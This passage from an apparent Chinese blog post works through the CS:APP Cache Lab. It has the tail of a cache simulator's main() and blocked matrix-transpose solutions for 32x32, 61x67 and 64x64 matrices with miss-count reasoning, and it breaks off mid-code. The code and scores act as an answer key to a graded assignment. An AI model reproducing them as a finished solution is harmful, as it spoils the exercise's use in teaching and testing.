class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> M:</span><br><span class="line">                do_modify(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> S:</span><br><span class="line">                do_store(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 系统输入参数</span></span><br><span class="line">    param sys_param;</span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    <span class="keyword">size_t</span> trace_item_len = <span class="number">10</span>;</span><br><span class="line">    trace_item *trace_items = (trace_item *) <span class="built_in">malloc</span>(trace_item_len * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">    <span class="comment">// 系统cache</span></span><br><span class="line">    cache sys_cache;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析参数</span></span><br><span class="line">    ret = parse_input_params(argc, argv, &amp;sys_param);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse input params failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    ret = parse_trace_file(&amp;trace_items, &amp;trace_item_len, sys_param.t);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse trace file failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化系统cache</span></span><br><span class="line">    init_cache(&amp;sys_cache, &amp;sys_param);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 开始仿真</span></span><br><span class="line">    simulate(&amp;sys_cache, &amp;sys_param, trace_items, trace_item_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    printSummary(hits, miss, evicts);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-第二部分–编写cache友好代码"><a href="#2-第二部分–编写cache友好代码" class="headerlink" title="2. 第二部分–编写cache友好代码"></a>2. 第二部分–编写cache友好代码</h2><p>本题能加强学生对cache的认识，编写cahce友好的代码。原题很简单，就是给一个矩阵A，求其转置。但是有一些额外说明，具体请读writeup。下面是本题的答案要求：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729141941145.png" alt="image-20200729141941145"></p><p>m，代表miss次数。</p><p>本题核心点：</p><ol><li>加强理解直接相联映射</li><li><strong>理解blocking（分块）机制带来的时间局部性提升</strong></li></ol><p>重点：<strong>blocking机制</strong>，一定要理解blocking，请参照： <span class="exturl" data-url="aHR0cDovL2NzYXBwLmNzLmNtdS5lZHUvcHVibGljL3dhc2lkZS93YXNpZGUtYmxvY2tpbmcucGRm" title="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf<i class="fa fa-external-link"></i></span></p><p>在正式解题前，先说下系统的一些参数，最重要的就是cache的组织方式了：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729142729751.png" alt="image-20200729142729751"></p><p>s=5, S=32, 即32组</p><p>E=1， 即每组一个cacheline</p><p>b=5，B=32， 即一个cacheline的block大小为32字节（后面简称cacheline大小为32字节，实际说的是cacheline内部的block大小）</p><p>blocking机制运用到矩阵转置来，即将A分成多个行条带，A行条带扫描。B分为多个块，每个块由多个条带组成，每个B条带按照列扫描。如图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144043920.png" alt="image-20200729144043920"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144439379.png" alt="image-20200729144147785"></p><h3 id="1-32x32"><a href="#1-32x32" class="headerlink" title="1. 32x32"></a>1. 32x32</h3><p>一个cacheline 32字节， 一个int 4字节， 则一个cacheline可以放8个int， 矩阵为32x32， 则矩阵一行需要4个cacheline。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729143603293.png" alt="image-20200729143546012"></p><p>现在的问题是如何确定条带的长度。 </p><p>我们知道cpu一次read，都会load一个cache line到cache中。一个cacheline是32字节。如何将条带设置低于32字节，比如12字节，那么32字节中会有20字节无法利用，浪费了一半的cache。如果大于32字节，那扫描一个条带就会触发至少2次load。那是不是设置成32字节就好了？也不是，我们还要考虑A，B的load，store交替过程中，会造成cacheline的overlap（冲突不命中）。为了让你理解这个概念，先看以下面这道题：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145230952.png" alt="image-20200729145230952" style="zoom:50%;" /><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145241517.png" alt="image-20200729145241517" style="zoom:50%;" /><p>现在回到我们的题目，我们想要cacheline的利用率高，又不想发生太多cacheline的冲突不命中。观察到在32x32的矩阵中，<strong>每8行重复一个cache空间。</strong>如果一个条带为32字节，即8个矩阵元素，刚好对应了一个cache line大小。所以我们可以设置， A的行扫描条带为8个元素， B的列扫描条带为8个元素，那一个块的宽度呢？显然一个cacheline是32字节，刚好也是8个元素，宽度为8肯定利用率高。</p><p>最终决定的参数：</p><ol><li>A行条带 8元素</li><li>B中一个块的大小为8x8</li></ol><p><strong>另外，miss数计算会在之后给出。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> 这里采用4循环是为了更好理解“blocking”机制，其实采用3个循环就能做，具体是融合j和k</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k,q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    B[i + q][k] = A[k][i + q];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写，miss数是300多，而满分要求miss数&lt;300. 继续分析，什么导致了多余的miss？</p><p>cachelab的writeup中，有这样一句话：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729150322560.png" alt="image-20200729150322560"></p><p>对角线？ 是的，对角线上的元素，会发生冲突不命中问题。究其根本，在于我们对A进行了反复读。如何解决？把A的数据放到寄存器就行了。再次回到write u中：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d3314195aa594512d18.png"></p><p>题目要求我们最多不能定义12个局部变量，上述代码仅仅4个。我们还有8个变量没用，最终的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief block size 8</span></span><br><span class="line"><span class="comment"> * miss计算:</span></span><br><span class="line"><span class="comment"> * BSIZE 8， 总共分为了16块， 假设块编号从0开始，由左向右，由上向下。</span></span><br><span class="line"><span class="comment"> * 则左边第一列块中的每一块（块编号为0,4,8,12)miss数为(9+7+7)：</span></span><br><span class="line"><span class="comment"> * 1.第1个9代表 load A的第一个条带(1个miss)+ store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2.第2个7代表 load A的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 3.第3个7代表，store B的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 具体可参见文件： m32n32-23miss</span></span><br><span class="line"><span class="comment"> * 所以这4个块总miss为：4*(9+7+7) = 92</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 上述说完了最靠左边的一列block，还剩3列block，3*4 = 12个block</span></span><br><span class="line"><span class="comment"> * 这些block的共性就是 load A条带不会和Store A条带冲突。</span></span><br><span class="line"><span class="comment"> * 所以扫描完一个block会造成的miss为8+8：</span></span><br><span class="line"><span class="comment"> * 1. 第一个8代表，store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2. 第二个8代表， load 8个A条带带来的miss</span></span><br><span class="line"><span class="comment"> * 所以这12个块总miss为： 12*(8+8) = 192</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-16miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 另外还有3个固定的额外开销，具体对应哪个cache miss未知，猜测为初始化循环变量带来的（不过又觉得应该不是，如果你知道，还请告诉我）</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-extra-miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 所以最终的miss为:</span></span><br><span class="line"><span class="comment"> * 92+192+3 = 287</span></span><br><span class="line"><span class="comment"> * @param A </span></span><br><span class="line"><span class="comment"> * @param B </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> trans32_v1_desc[] = <span class="string">&quot;trans32_v1_desc&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 避免对角线的 A B矩阵cacheline竞争</span></span><br><span class="line">                t0 = A[k][i + <span class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                B[i + <span class="number">4</span>][k] = t4;</span><br><span class="line">                B[i + <span class="number">5</span>][k] = t5;</span><br><span class="line">                B[i + <span class="number">6</span>][k] = t6;</span><br><span class="line">                B[i + <span class="number">7</span>][k] = t7;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 第二种写法,但是存在对角线竞争</span></span><br><span class="line">                <span class="comment">// for (q = 0; q &lt; BSIZE; q++) // 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                <span class="comment">// &#123;</span></span><br><span class="line">                <span class="comment">//     B[i + q][k] = A[k][i + q];</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss数为287</strong>，在代码的注释部分，给出了miss的详细计算方式。</p><h3 id="2-61x67"><a href="#2-61x67" class="headerlink" title="2. 61x67"></a>2. 61x67</h3><p>64x64的最后来说，先把简单的说了来。</p><p>61和67看着不规则比较难，但是题目要求很松，只要低于2000miss即可。</p><p>依然是上面的算法，更改BSIZE, 经测试BSIZE=16就能满足要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans6761_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">67</span>][<span class="number">61</span>], <span class="keyword">int</span> B[<span class="number">61</span>][<span class="number">67</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 从A矩阵视角</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 16</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k, q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &lt; M &amp;&amp; i + q &lt; N)</span><br><span class="line">                    &#123;</span><br><span class="line">                        B[i + q][k] = A[k][i + q];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> N</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> M</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss为1817</strong></p><h3 id="3-64x64"><a href="#3-64x64" class="headerlink" title="3. 64x64"></a>3. 64x64</h3><p>64x64则难很多了，如果依然照搬上面的算法，最终的miss应该是1800多，离满分1300还差很远。来分析下原因：</p><ol><li>如果BSIZE 依然取8会发生什么问题？</li></ol><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d5b14195aa594514cfb.png" alt="image-20200729151739512"></p><p>上图给出了此时的矩阵内部cacheline分布，有个很严重的问题在于一个cache空间，在矩阵中仅4行就重复了。那如果条带继续为8， B列向扫描一个条带，后4个元素就会替换前4个元素所在的cacheline。造成过多<strong>冲突不命中</strong>。</p><ol start="2"><li>那，如果将BSIZE设置为4呢？</li></ol><p>实际上，采用同样的算法，BSIZE=4,的确是最优的了。但是设置为4又会带来什么缺点？<strong>cacheline的利用率仅有一半</strong>。 一个cacheline 32字节，可装载8个元素，但实际只是用了4个元素。</p><ol start="3"><li>那，如何保住利用率的同时，减少冲突不命中？</li></ol><p>要保住利用率，BSIZE应该是8的整数倍。但是冲突不命中如何解决？</p><p>以BSIZE=8为例：</p><p>A条带长度为8，我们将一个A条带的前4列正常填入B的前4行，而<strong>A条带的后4列填入到其他地方，</strong>再等待某个时机，将这些临时填充的数据归还到正确位置即可。示意图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d6b14195aa59451559a.png" alt="image-20200729153035966"></p><p>绿色代表正常填入区间。</p><p>灰色代表本应该填入，但是不填入，转而填入到红色区域。</p><p>红色区域代表临时填充区间。</p><p>接着，在某个时机：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d7d14195aa594515d89.png" alt="image-20200729153243973"></p><p>几个问题：</p><ol><li><p>为什么红色区域要横着填？</p><p>因为要考虑cache友好性，如果竖着填，那将跨越多个cacheline。</p></li><li><p>为什么要选择第0行，第4 5 6 7列 作为 第0列，第4 5 6 7行的临时区间？</p><p>这只是个示意图，实际上我选择了3种方案，最终方案不是这样映射的，贴这个图是为了方便理解。</p></li><li><p>某个时机？具体是什么时机？</p><p>将要填写第0行，第4,5,6,7列数据时，首先先移动数据到正确的位置（第0列，第4,5,6,7行），然后才填写第0行，第4，5,6,7列。</p></li><li><p>最靠右的块如何处理？它已经没有 右边的空间 作为缓冲了。</p><p>单独处理。具体之后会说。</p></li></ol><h4 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h4><p>最终我选择方案为： BSIZE=8，临时填充区间示意图如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d8c14195aa5945163a2.png" alt="image-20200729153935817"></p><p>为什么会这样选？如果像之前示意图那样选，依然会存在很多冲突映射，甚至不如不做映射。仔细分析了下trace file,手动模拟了cache line的load store过程，选择的这样的临时填充映射。</p><p><strong>最后再说说扫描到最后一个8x8的方格时如何处理</strong>，由于最后的方格右边已经没有空间做缓冲，那先考虑一个简单的，直接对A和B矩阵的最后8x8方格做一一映射。显然后4x8会把和前4x8会产生冲突不命中。</p><p>这样做的miss数应该是1500多。虽然比最开始的算法1800多，还是好不少，但依然没法满分。没办法，继续考虑。</p><p><strong>既然是后4x8和前4x8冲突了，那把两次赋值过程分开不就好了吗？</strong></p><p>是的，基于这样的思想，我改了代码，嗯，不错，<strong>这次跑的结果为1190</strong>。总算挤近1300了。</p><p>别忘了，依然要解决重复加载A条带带来的冲突不命中问题（即，多定义局部变量）。</p><p>最终代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans64_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">64</span>][<span class="number">64</span>], <span class="keyword">int</span> B[<span class="number">64</span>][<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 64</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += <span class="number">8</span>) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += <span class="number">8</span>) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + <span class="number">8</span>; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                t0 = A[k][i + <span class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 第一块</span></span><br><span class="line">                    <span class="comment">// 前4个正常放置</span></span><br><span class="line">                    B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                    B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                    B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                    B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 非第一块，首先需要将元素搬迁到正确的位置</span></span><br><span class="line">                    <span class="keyword">if</span> (k == j) <span class="comment">// 第一次进入该块时，搬迁</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 然后，填入本block正确的元素</span></span><br><span class="line">                    <span class="keyword">if</span> (j != LEN - <span class="number">8</span>)</span><br><span class="line">                    &#123; </span><br><span class="line">                        <span class="comment">// 中间块处理方式和第一块处理方式相同</span></span><br><span class="line">                        <span class="comment">// 前4个正常放置</span></span><br><span 